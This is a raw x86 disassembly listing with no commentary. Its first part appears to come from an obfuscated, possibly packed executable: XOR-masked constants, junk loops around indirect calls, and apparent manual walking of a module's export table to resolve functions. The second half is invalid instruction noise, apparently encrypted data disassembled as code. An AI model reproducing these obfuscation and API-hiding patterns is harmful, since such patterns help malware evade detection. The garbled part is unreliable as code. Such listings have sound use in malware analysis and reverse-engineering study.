  4061c8:	mov    ecx,DWORD PTR [ebp+0xc]
  4061cb:	xor    ecx,esi
  4061cd:	mov    BYTE PTR [ecx+ebx*1+0x3272f5],al
  4061d4:	mov    eax,DWORD PTR [ebp+0xc]
  4061d7:	xor    eax,esi
  4061d9:	add    eax,edi
  4061db:	pop    edi
  4061dc:	pop    esi
  4061dd:	pop    ebx
  4061de:	leave  
  4061df:	ret    0x8
  4061e2:	sbb    DWORD PTR ds:0x42b226,0x2deb
  4061ec:	xor    eax,eax
  4061ee:	sbb    DWORD PTR ds:0x42b1ce,0x42b18a
  4061f8:	inc    eax
  4061f9:	ret    
  4061fa:	push   ebp
  4061fb:	mov    ebp,esp
  4061fd:	sub    esp,0x38
  406200:	and    DWORD PTR ds:0x42b22a,0x0
  40620a:	mov    eax,ds:0x42b22a
  40620f:	inc    eax
  406210:	mov    ds:0x42b22a,eax
  406215:	cmp    DWORD PTR ds:0x42b22a,0x14
  40621c:	jbe    0x40624e
  406222:	jmp    0x406241
  406227:	push   0x42b216
  40622c:	push   0x1051
  406231:	push   0x42a251
  406236:	push   0x42a000
  40623b:	call   DWORD PTR ds:0x42b31e
  406241:	cmp    DWORD PTR ds:0x42b22a,0x12
  406248:	jb     0x40620a
  40624e:	mov    DWORD PTR [ebp-0x4],0xf89c85a5
  406255:	push   ebx
  406256:	mov    DWORD PTR [ebp-0xc],0xf89c85a2
  40625d:	mov    eax,DWORD PTR [ebp-0x4]
  406260:	push   esi
  406261:	and    DWORD PTR ds:0x42b22a,0x0
  40626b:	mov    esi,DWORD PTR ds:0x42b22a
  406271:	inc    esi
  406272:	mov    DWORD PTR ds:0x42b22a,esi
  406278:	cmp    DWORD PTR ds:0x42b22a,0x26
  40627f:	jbe    0x4062a0
  406285:	jmp    0x406293
  40628a:	push   DWORD PTR [ebp-0x1c]
  40628d:	call   DWORD PTR ds:0x42b322
  406293:	cmp    DWORD PTR ds:0x42b22a,0x16
  40629a:	jb     0x40626b
  4062a0:	mov    esi,0x75108ae
  4062a5:	or     DWORD PTR ds:0x42b1aa,0x42b19e
  4062af:	xor    eax,esi
  4062b1:	sub    DWORD PTR ds:0x42b1da,0x3dfa
  4062bb:	push   edi
  4062bc:	add    DWORD PTR ds:0x42b1ea,0x4970
  4062c6:	mov    edi,0x3272f5
  4062cb:	and    DWORD PTR ds:0x42b1ea,0x42b1d6
  4062d5:	add    eax,edi
  4062d7:	mov    DWORD PTR [ebp-0x1c],eax
  4062da:	mov    eax,DWORD PTR [ebp+0x14]
  4062dd:	add    DWORD PTR ds:0x42b22a,0x5e0e
  4062e7:	test   eax,eax
  4062e9:	je     0x40635d
  4062ef:	mov    DWORD PTR ds:0x42b1b6,0x13
  4062f9:	cmp    DWORD PTR ds:0x42b1b6,0x0
  406300:	je     0x40634f
  406306:	cmp    DWORD PTR ds:0x42b1b6,0x3
  40630d:	jle    0x40634f
  406313:	jmp    0x406323
  406318:	push   0x8d96
  40631d:	call   DWORD PTR ds:0x42b326
  406323:	cmp    DWORD PTR ds:0x42b1b6,0x4
  40632a:	jne    0x40633d
  406330:	mov    ebx,DWORD PTR ds:0x42b1b6
  406336:	dec    ebx
  406337:	mov    DWORD PTR ds:0x42b1b6,ebx
  40633d:	mov    ebx,DWORD PTR ds:0x42b1b6
  406343:	dec    ebx
  406344:	mov    DWORD PTR ds:0x42b1b6,ebx
  40634a:	jmp    0x4062f9
  40634f:	mov    eax,DWORD PTR [ebp+0x14]
  406352:	sbb    DWORD PTR ds:0x42b1ba,edx
  406358:	mov    eax,DWORD PTR [eax]
  40635a:	mov    DWORD PTR [ebp-0x1c],eax
  40635d:	and    ebx,DWORD PTR ds:0x42b1fa
  406363:	mov    eax,DWORD PTR [ebp-0x4]
  406366:	xor    eax,esi
  406368:	mov    DWORD PTR ds:0x42b22a,0x1f
  406372:	cmp    DWORD PTR ds:0x42b22a,0x0
  406379:	je     0x4063c1
  40637f:	cmp    DWORD PTR ds:0x42b22a,0x2a
  406386:	jg     0x4063c1
  40638c:	jmp    0x4063af
  406391:	push   0x42a061
  406396:	push   0x44b1
  40639b:	push   DWORD PTR [ebp-0x1c]
  40639e:	push   DWORD PTR [ebp-0x18]
  4063a1:	push   DWORD PTR [ebp-0x1c]
  4063a4:	push   0x7663
  4063a9:	call   DWORD PTR ds:0x42b2ea
  4063af:	mov    ebx,DWORD PTR ds:0x42b22a
  4063b5:	dec    ebx
  4063b6:	mov    DWORD PTR ds:0x42b22a,ebx
  4063bc:	jmp    0x406372
  4063c1:	add    eax,edi
  4063c3:	mov    DWORD PTR [ebp-0x8],eax
  4063c6:	sub    eax,eax
  4063c8:	mov    eax,DWORD PTR [ebp-0xc]
  4063cb:	add    DWORD PTR ds:0x42b196,ecx
  4063d1:	xor    eax,esi
  4063d3:	adc    ebx,DWORD PTR ds:0x42b1aa
  4063d9:	add    eax,edi
  4063db:	add    ebx,DWORD PTR ds:0x42b186
  4063e1:	mov    DWORD PTR [ebp-0x24],eax
  4063e4:	mov    eax,DWORD PTR [ebp-0x4]
  4063e7:	add    ebx,DWORD PTR ds:0x42b1ba
  4063ed:	xor    eax,esi
  4063ef:	and    DWORD PTR ds:0x42b19e,0x0
  4063f9:	jmp    0x40640b
  4063fe:	mov    ebx,DWORD PTR ds:0x42b19e
  406404:	inc    ebx
  406405:	mov    DWORD PTR ds:0x42b19e,ebx
  40640b:	cmp    DWORD PTR ds:0x42b19e,0x1e
  406412:	jae    0x406444
  406418:	cmp    DWORD PTR ds:0x42b19e,0x27
  40641f:	ja     0x406444
  406425:	jmp    0x40643f
  40642a:	push   0x42a061
  40642f:	push   DWORD PTR [ebp-0x20]
  406432:	push   0x0
  406434:	push   0x6ce9
  406439:	call   DWORD PTR ds:0x42b2ee
  40643f:	jmp    0x4063fe
  406444:	add    eax,edi
  406446:	mov    DWORD PTR [ebp-0x30],eax
  406449:	movzx  ebx,BYTE PTR ds:0x42b22e
  406450:	add    ebx,DWORD PTR ds:0x42b1c6
  406456:	mov    DWORD PTR ds:0x42b22e,ebx
  40645c:	mov    ebx,DWORD PTR [ebp-0x4]
  40645f:	xor    ebx,esi
  406461:	mov    eax,ds:0x42b1da
  406466:	or     DWORD PTR ds:0x42b1ee,eax
  40646c:	add    ebx,edi
  40646e:	and    DWORD PTR ds:0x42b1b2,0x0
  406478:	mov    eax,ds:0x42b1b2
  40647d:	inc    eax
  40647e:	mov    ds:0x42b1b2,eax
  406483:	cmp    DWORD PTR ds:0x42b1b2,0x1f
  40648a:	jg     0x4064ab
  406490:	jmp    0x40649e
  406495:	push   DWORD PTR [ebp-0x1c]
  406498:	call   DWORD PTR ds:0x42b2f2
  40649e:	cmp    DWORD PTR ds:0x42b1b2,0x17
  4064a5:	jb     0x406478
  4064ab:	mov    eax,DWORD PTR [ebp-0x24]
  4064ae:	and    DWORD PTR ds:0x42b1e2,0x6649
  4064b8:	sub    eax,edi
  4064ba:	sub    DWORD PTR ds:0x42b22e,0x1376
  4064c4:	lea    ecx,[ebx-0x3272f5]
  4064ca:	xor    DWORD PTR ds:0x42b212,0x3b15
  4064d4:	xor    eax,esi
  4064d6:	adc    DWORD PTR ds:0x42b216,0x7bbc
  4064e0:	xor    ecx,esi
  4064e2:	cmp    ecx,eax
  4064e4:	je     0x40678a
  4064ea:	mov    eax,ds:0x42b18a
  4064ef:	sbb    eax,DWORD PTR ds:0x42b192
  4064f5:	mov    ds:0x42b18a,eax
  4064fa:	mov    eax,DWORD PTR [ebp-0x4]
  4064fd:	xor    eax,esi
  4064ff:	add    eax,edi
  406501:	mov    DWORD PTR ds:0x42b21e,0x72e1
  40650b:	cmp    ebx,eax
  40650d:	mov    DWORD PTR ds:0x42b202,0xd47
  406517:	jne    0x406767
  40651d:	xor    DWORD PTR ds:0x42b1f2,0x42b1b6
  406527:	push   DWORD PTR [ebp+0x8]
  40652a:	call   0x424022
  40652f:	xor    DWORD PTR ds:0x42b1b2,edx
  406535:	mov    DWORD PTR [ebp-0x14],eax
  406538:	mov    ecx,DWORD PTR ds:0x42b296
  40653e:	mov    ecx,DWORD PTR [ecx]
  406540:	sbb    DWORD PTR ds:0x42b1f6,ecx
  406546:	mov    eax,DWORD PTR [ebp-0x4]
  406549:	sbb    DWORD PTR ds:0x42b1d6,ecx
  40654f:	mov    ecx,DWORD PTR [ebp-0x14]
  406552:	xor    eax,esi
  406554:	add    eax,edi
  406556:	mov    DWORD PTR ds:0x42b226,0x75db
  406560:	cmp    ecx,eax
  406562:	je     0x4067f5
  406568:	push   DWORD PTR [ebp-0x14]
  40656b:	push   DWORD PTR [ebp+0x8]
  40656e:	mov    DWORD PTR ds:0x42b196,0x32ca
  406578:	call   0x424138
  40657d:	mov    DWORD PTR [ebp-0x14],eax
  406580:	adc    DWORD PTR ds:0x42b18a,ecx
  406586:	mov    eax,DWORD PTR [ebp-0x4]
  406589:	adc    DWORD PTR ds:0x42b186,ecx
  40658f:	mov    ecx,DWORD PTR [ebp-0x14]
  406592:	sub    DWORD PTR ds:0x42b1e6,0x42b196
  40659c:	xor    eax,esi
  40659e:	adc    DWORD PTR ds:0x42b212,0x42b1f6
  4065a8:	add    eax,edi
  4065aa:	cmp    ecx,eax
  4065ac:	mov    DWORD PTR ds:0x42b1da,0x7670
  4065b6:	je     0x4067f5
  4065bc:	xor    eax,eax
  4065be:	add    eax,DWORD PTR ds:0x42b19a
  4065c4:	and    eax,DWORD PTR ds:0x42b1be
  4065ca:	mov    ds:0x42b19a,eax
  4065cf:	mov    eax,DWORD PTR [ebp-0x14]
  4065d2:	mov    eax,DWORD PTR [eax+0x18]
  4065d5:	and    DWORD PTR ds:0x42b1e2,0x0
  4065df:	jmp    0x4065f1
  4065e4:	mov    ecx,DWORD PTR ds:0x42b1e2
  4065ea:	inc    ecx
  4065eb:	mov    DWORD PTR ds:0x42b1e2,ecx
  4065f1:	cmp    DWORD PTR ds:0x42b1e2,0x13
  4065f8:	jae    0x40663a
  4065fe:	cmp    DWORD PTR ds:0x42b1e2,0x9
  406605:	jb     0x40663a
  40660b:	jmp    0x40661b
  406610:	push   0x42b206
  406615:	call   DWORD PTR ds:0x42b2f6
  40661b:	cmp    DWORD PTR ds:0x42b1e2,0x8
  406622:	jne    0x406635
  406628:	mov    ecx,DWORD PTR ds:0x42b1e2
  40662e:	inc    ecx
  40662f:	mov    DWORD PTR ds:0x42b1e2,ecx
  406635:	jmp    0x4065e4
  40663a:	mov    DWORD PTR [ebp-0x24],eax
  40663d:	mov    eax,DWORD PTR [ebp-0x14]
  406640:	mov    ecx,DWORD PTR ds:0x42b1c2
  406646:	adc    ecx,DWORD PTR ds:0x42b1b2
  40664c:	mov    DWORD PTR ds:0x42b1c2,ecx
  406652:	mov    ecx,DWORD PTR [ebp+0x8]
  406655:	or     DWORD PTR ds:0x42b1f6,0x7077
  40665f:	add    ecx,DWORD PTR [eax+0x20]
  406662:	and    eax,0x7368
  406667:	mov    DWORD PTR [ebp-0x2c],ecx
  40666a:	mov    eax,DWORD PTR [ebp-0x14]
  40666d:	and    DWORD PTR ds:0x42b21a,0x0
  406677:	jmp    0x40668b
  40667c:	xor    ecx,ecx
  40667e:	or     ecx,DWORD PTR ds:0x42b21a
  406684:	inc    ecx
  406685:	mov    DWORD PTR ds:0x42b21a,ecx
  40668b:	cmp    DWORD PTR ds:0x42b21a,0x1c
  406692:	jae    0x4066e3
  406698:	cmp    DWORD PTR ds:0x42b21a,0x5
  40669f:	jbe    0x4066e3
  4066a5:	jmp    0x4066c4
  4066aa:	push   0x42b1f6
  4066af:	push   0x42b18e
  4066b4:	push   0x52aa
  4066b9:	push   0x42a0fe
  4066be:	call   DWORD PTR ds:0x42b2fa
  4066c4:	cmp    DWORD PTR ds:0x42b21a,0x4
  4066cb:	jne    0x4066de
  4066d1:	mov    ecx,DWORD PTR ds:0x42b21a
  4066d7:	inc    ecx
  4066d8:	mov    DWORD PTR ds:0x42b21a,ecx
  4066de:	jmp    0x40667c
  4066e3:	mov    ecx,DWORD PTR [ebp+0x8]
  4066e6:	add    ecx,DWORD PTR [eax+0x24]
  4066e9:	mov    DWORD PTR [ebp-0x34],ecx
  4066ec:	adc    DWORD PTR ds:0x42b212,0x34a6
  4066f6:	mov    eax,DWORD PTR [ebp-0x14]
  4066f9:	and    DWORD PTR ds:0x42b192,0x0
  406703:	mov    ecx,DWORD PTR ds:0x42b192
  406709:	inc    ecx
  40670a:	mov    DWORD PTR ds:0x42b192,ecx
  406710:	cmp    DWORD PTR ds:0x42b192,0x4
  406717:	jbe    0x406759
  40671d:	jmp    0x406732
  406722:	push   0x42b1b6
  406727:	push   0x42a2a1
  40672c:	call   DWORD PTR ds:0x42b2fe
  406732:	cmp    DWORD PTR ds:0x42b192,0x3
  406739:	jne    0x40674c
  40673f:	mov    ecx,DWORD PTR ds:0x42b192
  406745:	inc    ecx
  406746:	mov    DWORD PTR ds:0x42b192,ecx
  40674c:	cmp    DWORD PTR ds:0x42b192,0x13
  406753:	jb     0x406703
  406759:	mov    ecx,DWORD PTR [ebp+0x8]
  40675c:	add    ecx,DWORD PTR [eax+0x1c]
  40675f:	mov    DWORD PTR [ebp-0x14],ecx
  406762:	jmp    0x4067bd
  406767:	mov    eax,DWORD PTR [ebp-0x2c]
  40676a:	mov    ecx,DWORD PTR [ebp+0x8]
  40676d:	add    ecx,DWORD PTR [eax+ebx*4]
  406770:	mov    DWORD PTR [ebp-0x28],ecx
  406773:	mov    eax,DWORD PTR [ebp-0x4]
  406776:	mov    ecx,DWORD PTR [ebp-0x28]
  406779:	xor    eax,esi
  40677b:	add    eax,edi
  40677d:	cmp    ecx,eax
  40677f:	je     0x4067bd
  406785:	jmp    0x4067ae
  40678a:	mov    eax,DWORD PTR [ebp-0x4]
  40678d:	mov    ecx,DWORD PTR [ebp-0x8]
  406790:	xor    eax,esi
  406792:	add    eax,edi
  406794:	cmp    ecx,eax
  406796:	mov    eax,DWORD PTR [ebp-0x4]
  406799:	je     0x4067f8
  40679f:	mov    ecx,DWORD PTR [ebp-0x30]
  4067a2:	xor    eax,esi
  4067a4:	add    eax,edi
  4067a6:	cmp    ecx,eax
  4067a8:	je     0x406801
  4067ae:	lea    eax,[ebp-0x8]
  4067b1:	push   eax
  4067b2:	push   DWORD PTR [ebp-0x28]
  4067b5:	push   DWORD PTR [ebp+0xc]
  4067b8:	call   0x40f847
  4067bd:	mov    eax,DWORD PTR [ebp-0x4]
  4067c0:	mov    ecx,DWORD PTR [ebp-0x8]
  4067c3:	xor    eax,esi
  4067c5:	add    eax,edi
  4067c7:	cmp    ecx,eax
  4067c9:	je     0x4067e4
  4067cf:	mov    eax,DWORD PTR [ebp-0x34]
  4067d2:	movzx  eax,WORD PTR [eax+ebx*2]
  4067d6:	mov    ecx,DWORD PTR [ebp-0x14]
  4067d9:	mov    eax,DWORD PTR [ecx+eax*4]
  4067dc:	mov    DWORD PTR [ebp-0x38],eax
  4067df:	jmp    0x40678a
  4067e4:	mov    eax,DWORD PTR [ebp-0xc]
  4067e7:	xor    eax,esi
  4067e9:	lea    ebx,[ebx+eax*1+0x3272f5]
  4067f0:	jmp    0x40646e
  4067f5:	mov    eax,DWORD PTR [ebp-0x4]
  4067f8:	xor    eax,esi
  4067fa:	add    eax,edi
  4067fc:	jmp    0x40f768
  406801:	mov    eax,DWORD PTR [ebp-0x38]
  406804:	add    eax,DWORD PTR [ebp+0x8]
  406807:	mov    DWORD PTR [ebp-0x18],eax
  40680a:	mov    eax,DWORD PTR [ebp-0x1c]
  40680d:	test   eax,eax
  40680f:	je     0x40afcd
  406815:	mov    DWORD PTR [ebp-0x20],0x0
  40681c:	push   0x3
  40681e:	xor    edx,edx
  406820:	pop    edx
  406821:	add    edx,0x8
  406824:	push   edx
  406825:	pop    ecx
  406826:	push   0x6
  406828:	dec    ecx
  406829:	pop    ebx
  40682a:	dec    ebx
  40682b:	xchg   ebx,ecx
  40682d:	sub    ebx,ecx
  40682f:	xchg   ebx,ecx
  406831:	dec    ecx
  406832:	mov    eax,DWORD PTR [ebp-0x1c]
  406835:	imul   eax,ecx
  406838:	sub    esp,eax
  40683a:	mov    DWORD PTR [ebp-0x20],esp
  40683d:	mov    eax,DWORD PTR [ebp-0x4]
  406840:	xor    eax,esi
  406842:	add    eax,edi
  406844:	jmp    0x408c14
  406849:	mov    ecx,DWORD PTR [ebp-0xc]
  40684c:	mov    eax,DWORD PTR [ebp+0x8]
  40684f:	mov    edx,DWORD PTR [ebp+0x14]
  406852:	mov    eax,DWORD PTR [edx+eax*4+0x4]
  406856:	xor    ecx,esi
  406858:	add    ecx,edi
  40685a:	xor    edx,edx
  40685c:	div    ecx
  40685e:	mov    ecx,DWORD PTR [ebp-0x4]
  406861:	xor    ecx,esi
  406863:	lea    eax,[ecx+eax*1+0x3272f5]
  40686a:	mov    ecx,DWORD PTR [ebp+0x8]
  40686d:	mov    edx,DWORD PTR [ebp-0x20]
  406870:	mov    DWORD PTR [edx+ecx*4],eax
  406873:	mov    eax,DWORD PTR [ebp-0xc]
  406876:	mov    ecx,DWORD PTR [ebp+0x8]
  406879:	xor    eax,esi
  40687b:	jmp    0x408c0d
  406880:	mov    ebx,0x2cc0cea
  406885:	mov    bh,BYTE PTR [ebx-0x264bb77e]
  40688b:	pop    esi
  40688c:	mov    ebx,esp
  40688e:	push   ebp
  40688f:	dec    edi
  406890:	adc    edi,DWORD PTR ds:0x5e0c8383
  406896:	add    DWORD PTR [ebx-0x6fa7a238],0xffffffd9
  40689d:	adc    eax,DWORD PTR [esi+0x67]
  4068a0:	mov    ah,0x5b
  4068a2:	test   DWORD PTR [ebx+0x62],0xddedea1b
  4068a9:	add    BYTE PTR [ecx],ch
  4068ab:	addr16 push ss
  4068ad:	ds call 0xa3a11733
  4068b3:	aam    0xf6
  4068b5:	add    BYTE PTR [edi+0x26b3a5b7],0x5f
  4068bc:	add    DWORD PTR [ecx],ebp
  4068be:	sbb    ebx,edx
  4068c0:	xlat   BYTE PTR ds:[ebx]
  4068c1:	clc    
  4068c2:	push   ecx
  4068c3:	and    BYTE PTR [edx+0x1e],al
  4068c6:	push   ss
  4068c7:	outs   dx,DWORD PTR ds:[esi]
  4068c8:	mov    eax,cs
  4068ca:	sub    BYTE PTR ds:0x5e3e76a0,bl
  4068d0:	out    dx,al
  4068d1:	pop    esp
  4068d2:	cwde   
  4068d3:	xchg   esi,eax
  4068d4:	dec    ecx
  4068d5:	lods   al,BYTE PTR ds:[esi]
  4068d6:	jae    0x406908
  4068d8:	mov    WORD PTR [ebp+0x50],es
  4068db:	xchg   DWORD PTR [ebx],ebp
  4068dd:	sbb    eax,0x91fc2f23
  4068e2:	fsub   QWORD PTR [ebx-0x77e17c0d]
  4068e8:	mov    ds:0x3f860d40,eax
  4068ed:	inc    edx
  4068ee:	inc    esp
  4068ef:	sub    eax,0xe65a71a0
  4068f4:	cmp    BYTE PTR [ebx-0x5f04d602],0xea
  4068fb:	jp     0x406936
  4068fd:	out    dx,eax
  4068fe:	cs push ebx
  406900:	je     0x4068fc
  406902:	and    al,0xf4
  406904:	or     BYTE PTR [edx+0x37],cl
  406907:	cmp    DWORD PTR [ecx],0x6aceb28
  40690d:	inc    ebx
  40690e:	pop    ss
  40690f:	les    esp,FWORD PTR [edi+0x777480a9]
  406915:	adc    eax,DWORD PTR ds:0xa5356658
  40691b:	dec    eax
  40691c:	cmp    ecx,DWORD PTR [esi]
  40691e:	push   edi
  40691f:	xchg   ch,dl
  406921:	sbb    dh,dh
  406923:	retf   0xbbf7
  406926:	xor    dh,bh
  406928:	add    ah,BYTE PTR [edi+eax*2]
  40692b:	mov    dh,0x9
  40692d:	out    dx,eax
  40692e:	icebp  
  40692f:	inc    ecx
  406930:	jo     0x406959
  406932:	jnp    0x40693b
  406934:	call   0x58fc:0xa3bf77fb
  40693b:	std    
  40693c:	and    bl,BYTE PTR [edi]
  40693e:	sub    esi,DWORD PTR [edi+0xf39755d]
  406944:	js     0x406997
  406946:	das    
  406947:	clc    
  406948:	sub    al,0x98
  40694a:	ins    BYTE PTR es:[edi],dx
  40694b:	dec    edi
  40694c:	int3   
  40694d:	stos   DWORD PTR es:[edi],eax
  40694e:	int    0x6
  406950:	mov    ecx,0x7cb3a97d
  406955:	(bad)  
  406956:	iret   
  406957:	xor    DWORD PTR [edi+ecx*8+0x82284a0],esi
  40695e:	call   0x2418:0x707d1456
  406965:	or     BYTE PTR [ecx+ebx*8+0xacb8cfc],bl
  40696c:	or     BYTE PTR [edx+0x3f96dffb],0x66
  406973:	xchg   edi,eax
  406974:	inc    edi
  406975:	lods   eax,DWORD PTR ds:[esi]
  406976:	mov    ecx,0xc64988f3
  40697b:	retf   0xd07
  40697e:	push   cs
  40697f:	repnz mov DWORD PTR [ebx+edx*8+0x3cd20e3d],ebx
  406987:	or     DWORD PTR [ebx],eax
  406989:	jmp    0x990e:0x9c0e624d
  406990:	push   es
  406991:	out    0xb3,al
  406993:	into   
  406994:	pop    eax
  406995:	or     eax,0xedd713b3
  40699a:	sub    DWORD PTR [edx],ecx
  40699c:	icebp  
  40699d:	cmp    al,0x24
  40699f:	loop   0x406938
  4069a1:	cmp    BYTE PTR [edx-0x22],ch
  4069a4:	sub    ch,BYTE PTR [ecx+0x31]
  4069a7:	cmp    ebp,DWORD PTR [ecx]
  4069a9:	push   esp
  4069aa:	or     al,0x6d
  4069ac:	movs   BYTE PTR es:[edi],BYTE PTR cs:[esi]
  4069ae:	cmp    eax,0xda098817
  4069b3:	xor    eax,0x6a21a453
  4069b8:	into   
  4069b9:	mov    al,ds:0x2d2f5632
  4069be:	test   al,0xeb
  4069c0:	sahf   
  4069c1:	loope  0x406969
  4069c3:	xor    ah,BYTE PTR [edi-0x26e16e8]
  4069c9:	inc    esi
  4069ca:	inc    eax
  4069cb:	(bad)  
  4069cc:	mov    al,0x96
  4069ce:	xchg   ebp,eax
  4069cf:	iret   
  4069d0:	stos   BYTE PTR es:[edi],al
  4069d1:	sub    DWORD PTR [ecx-0x2a18a84b],0xef8c8551
  4069db:	jns    0x406972
  4069dd:	or     eax,0x38f5c14
  4069e2:	les    esi,FWORD PTR [ebx]
  4069e4:	aaa    
  4069e5:	ins    BYTE PTR es:[edi],dx
  4069e6:	add    DWORD PTR [ebp-0x751b6fff],ebp
  4069ec:	sub    DWORD PTR [ebp-0x20],edi
  4069ef:	sti    
  4069f0:	sahf   
  4069f1:	sbb    DWORD PTR [edx+0x3f],edi
  4069f4:	aas    
  4069f5:	and    BYTE PTR [esi],0x5d
  4069f8:	xlat   BYTE PTR ds:[ebx]
  4069f9:	cwde   
  4069fa:	or     BYTE PTR [esi-0x5263d303],ch
  406a00:	mov    eax,ds:0xbb1ec53c
  406a05:	pop    ds
  406a06:	sub    DWORD PTR [edi-0x61],esp
  406a09:	add    cl,BYTE PTR [ecx]
  406a0b:	xchg   ebp,eax
  406a0c:	les    edi,FWORD PTR [ebp-0x67]
  406a0f:	mov    al,ds:0x141b583f
  406a14:	fdivrp st(1),st
  406a16:	inc    esp
  406a17:	shl    DWORD PTR [edx+0x4d],0x90
  406a1b:	cmp    edi,DWORD PTR [ecx]
  406a1d:	inc    ecx
  406a1e:	loope  0x406a65
  406a20:	cli    
  406a21:	xor    edi,edx
  406a23:	and    ebx,esp
  406a25:	sub    ebx,esp
  406a27:	xchg   esi,eax
  406a28:	leave  
  406a29:	xchg   ebx,eax
  406a2a:	xchg   ebp,eax
  406a2b:	mov    ebp,0x5d4929d5
  406a30:	shr    BYTE PTR [ebx],1
  406a32:	pushf  
  406a33:	lods   al,BYTE PTR ds:[esi]
  406a34:	sub    eax,0xfb524eae
  406a39:	inc    ebp
  406a3a:	mov    ah,0xb8
  406a3c:	fidiv  DWORD PTR [ebp-0x2289e8f4]
  406a42:	fild   QWORD PTR ds:0x89c6c026
  406a48:	fild   DWORD PTR [bp+di-0x2bdd]
  406a4d:	adc    cl,bh
  406a4f:	in     al,dx
  406a50:	xchg   edi,eax
  406a51:	xor    eax,0xa423ed6
  406a56:	data16 adc ch,ch
  406a59:	out    dx,eax
  406a5a:	or     ch,bh
  406a5c:	sar    BYTE PTR [ebx],0x26
  406a5f:	push   es
  406a60:	retf   0x308b
  406a63:	and    al,0x97
  406a65:	jnp    0x406abf
  406a67:	inc    ebp
  406a68:	rcr    DWORD PTR [edx],cl
  406a6a:	inc    edi
  406a6b:	or     al,0x42
  406a6d:	jmp    0xd33d:0xd3dec104
  406a74:	mov    ds:0xe75410ae,al
  406a79:	cdq    
  406a7a:	enter  0x3dfd,0x73
  406a7e:	lods   al,BYTE PTR ds:[esi]
  406a7f:	cmp    al,ah
  406a81:	sub    al,0x1b
  406a83:	jmp    0x406aed
  406a85:	add    al,0xa6
  406a87:	shr    BYTE PTR [ecx],cl
  406a89:	loopne 0x406b02
  406a8b:	lods   eax,DWORD PTR ds:[esi]
  406a8c:	aad    0x18
  406a8e:	call   0xf2b9:0xbb110cfa
  406a95:	shr    ah,cl
  406a97:	rcr    ch,cl
  406a99:	mov    bh,0xfb
  406a9b:	mov    esp,0xef056df9
  406aa0:	mov    ebx,0x166d90b3
  406aa5:	mov    al,ch
  406aa7:	lock sub ebp,edx
  406aaa:	and    DWORD PTR [ebp+0x6e5b9f21],ebp
  406ab0:	stos   BYTE PTR es:[edi],al
  406ab1:	enter  0xb2c5,0x38
  406ab5:	jne    0x406a93
  406ab7:	jnp    0x406ac2
  406ab9:	aas    
  406aba:	out    0xed,al
  406abc:	sbb    eax,0xb1630f1c
  406ac1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406ac2:	mov    al,0xc2
  406ac4:	outs   dx,DWORD PTR ds:[esi]
  406ac5:	dec    esp
  406ac6:	lods   eax,DWORD PTR ds:[esi]
  406ac7:	rol    DWORD PTR [ebp+0x27],0x91
  406acb:	scas   eax,DWORD PTR es:[edi]
  406acc:	pop    eax
  406acd:	sub    al,0x7c
  406acf:	cli    
  406ad0:	int3   
  406ad1:	cmp    BYTE PTR [edx-0x7a],0x91
  406ad5:	cmp    BYTE PTR [ebx],bh
  406ad7:	gs or  al,0xb3
  406ada:	clc    
  406adb:	mov    eax,0x6ec89da7
  406ae0:	mov    al,ds:0x5aba9890
  406ae5:	shl    BYTE PTR ds:0x50cc102d,cl
  406aeb:	mov    esp,DWORD PTR [eax+edi*4]
  406aee:	mov    al,BYTE PTR [ebx]
  406af0:	push   ecx
  406af1:	xchg   ebx,eax
  406af2:	out    dx,eax
  406af3:	mov    eax,ds:0xefd89d10
  406af8:	in     eax,0x75
  406afa:	cmp    eax,0x40ca9cf8
  406aff:	hlt    
  406b00:	bound  eax,QWORD PTR [ebx+ebx*1-0x10fe9262]
  406b07:	add    esi,0xffffffec
  406b0a:	clc    
  406b0b:	sbb    al,0xa8
  406b0d:	xor    DWORD PTR [edi+0x1b],0x9489ade6
  406b14:	xchg   ebx,eax
  406b15:	pop    ecx
  406b16:	jae    0x406ac1
  406b18:	cmp    al,0x0
  406b1a:	pop    es
  406b1b:	push   ss
  406b1c:	out    0x70,eax
  406b1e:	js     0x406b88
  406b20:	inc    esp
  406b21:	in     eax,0x53
  406b23:	or     al,0x74
  406b26:	out    dx,al
  406b27:	dec    ebp
  406b28:	jmp    0x406ab1
  406b2a:	add    DWORD PTR [eax-0x4],esi
  406b2d:	repnz mov edx,0x662c7d9b
  406b33:	into   
  406b34:	xchg   edx,eax
  406b35:	les    ebx,FWORD PTR [ebx]
  406b37:	mov    dl,0x2e
  406b39:	xchg   esp,eax
  406b3a:	pop    ebx
  406b3b:	iret   
  406b3c:	cmp    DWORD PTR [ebx+0x168fdf50],0xfffffff8
  406b43:	mov    esp,DWORD PTR [edx-0x52bd6d65]
  406b49:	ja     0x406b74
  406b4b:	pusha  
  406b4c:	shl    dl,cl
  406b4e:	or     al,BYTE PTR [ebx+0x3]
  406b51:	(bad)  
  406b52:	adc    al,0x4
  406b54:	inc    ecx
  406b55:	jl     0x406b8a
  406b57:	pop    eax
  406b58:	je     0x406b3b
  406b5a:	push   ds
  406b5b:	mov    dh,0xec
  406b5d:	(bad)  
  406b5e:	fidivr DWORD PTR [edi-0x74a5edb4]
  406b64:	call   0xa064595a
  406b69:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406b6a:	pop    edx
  406b6b:	push   cs
  406b6c:	add    al,0xef
  406b6e:	adc    DWORD PTR [edx],0x3fe8ade0
  406b74:	leave  
  406b75:	mov    ebp,0xce677372
  406b7a:	inc    eax
  406b7b:	ror    BYTE PTR [edi+ebp*4+0x3b],1
  406b7f:	pop    ds
  406b80:	cli    
  406b81:	fldenv [eax]
  406b83:	pop    ds
  406b84:	pop    ss
  406b85:	xchg   edi,eax
  406b86:	stos   DWORD PTR es:[edi],eax
  406b87:	icebp  
  406b88:	loop   0x406b66
  406b8a:	mov    eax,ds:0x218e2ab
  406b8f:	fwait
  406b90:	ss and BYTE PTR ss:[esi+0x3ea2f5],ch
  406b98:	aad    0x5e
  406b9a:	xor    BYTE PTR [esi+0xa],0x1e
  406b9e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406b9f:	inc    ebp
  406ba0:	cli    
  406ba1:	leave  
  406ba2:	jl     0x406bf7
  406ba4:	lds    esp,FWORD PTR [esi-0x3a]
  406ba7:	icebp  
  406ba8:	je     0x406b84
  406baa:	ins    DWORD PTR es:[edi],dx
  406bab:	lock mov ds:0xc8739c,al
  406bb1:	cli    
  406bb2:	push   esp
  406bb3:	inc    edx
  406bb4:	and    al,0x3b
  406bb6:	mov    eax,ds:0x48145d68
  406bbb:	push   DWORD PTR [eax]
  406bbd:	push   ss
  406bbe:	or     al,0xeb
  406bc0:	aaa    
  406bc1:	icebp  
